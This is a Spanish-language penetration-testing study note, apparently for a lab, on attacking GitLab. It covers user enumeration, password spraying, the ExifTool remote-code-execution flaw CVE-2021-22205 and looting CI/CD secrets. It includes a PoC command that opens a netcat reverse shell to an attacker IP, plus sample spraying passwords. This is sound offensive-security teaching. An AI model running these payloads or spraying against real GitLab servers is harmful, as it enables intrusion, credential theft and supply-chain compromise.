---
tags:
  - Web/Red-Team
  - GitLab
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de GitLab]]"
Nota siguiente: "[[00 - Ataque a Tomcat CGI]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

GitLab acumula cientos de CVEs; varias graves llevan a RCE. Dos frentes: **acceso por credenciales** (enumeración + spraying → secretos) y **RCE por CVE**.

# Enumeración de usuarios + password spraying

GitLab no considera vulnerabilidad la enumeración de usuarios (así lo dice en su HackerOne), pero es útil: `/users/sign_up` distingue usuarios existentes. Un script lo automatiza:

```shell-session
$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
[+] The username root exists!
[+] The username bob exists!
```

Con la lista → *spraying* controlado (`Welcome1`, `Password123`) o reutilización de credenciales de leaks. <mark style="background: #FFB8EBA6;">Ojo al *lockout*</mark>: por defecto **10 intentos → bloqueo de 10 min** (`config.maximum_attempts`/`unlock_in`; configurable por UI desde 16.6).

# RCE por ExifTool — CVE-2021-22205

> [!important]+ La CVE que hay que conocer
> GitLab CE **≤ 13.10.2** sufre RCE porque pasa las imágenes subidas a una versión vulnerable de **ExifTool** (parser DjVu). <mark style="background: #FF5582A6;">La variante **no autenticada** (CVE-2021-22205, CVSS **10.0**, parcheada en 13.10.3/13.9.6/13.8.8) fue masivamente explotada</mark> (ransomware, botnets). El PoC autenticado (sirve con una cuenta de auto-registro):

```shell-session
$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 \
    -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
[+] RCE Triggered !!
# → shell como el usuario git
```

Módulo de Metasploit: `exploit/multi/http/gitlab_exif_rce`.

# Secretos en repos (post-acceso)

Con acceso, saquear repos e historial: credenciales, claves SSH, API keys, y **variables de CI/CD** (`Settings → CI/CD → Variables`). Los pipelines ejecutan comandos en los runners → pivote a la infraestructura. Herramientas: `gitleaks`, `trufflehog`.

> [!info]+ Modernización
> Más CVEs relevantes: **CVE-2022-2884** (RCE auth vía import de GitHub), **CVE-2023-2825** (*path traversal* → lectura de ficheros). GitLab es objetivo top de red team por su rol en la **cadena de suministro** — comprometerlo es acceder al código y despliegues de toda la organización. `nuclei -tags gitlab` para versión↔CVE.

Cambiamos a los **Common Gateway Interfaces**: [[00 - Ataque a Tomcat CGI]].
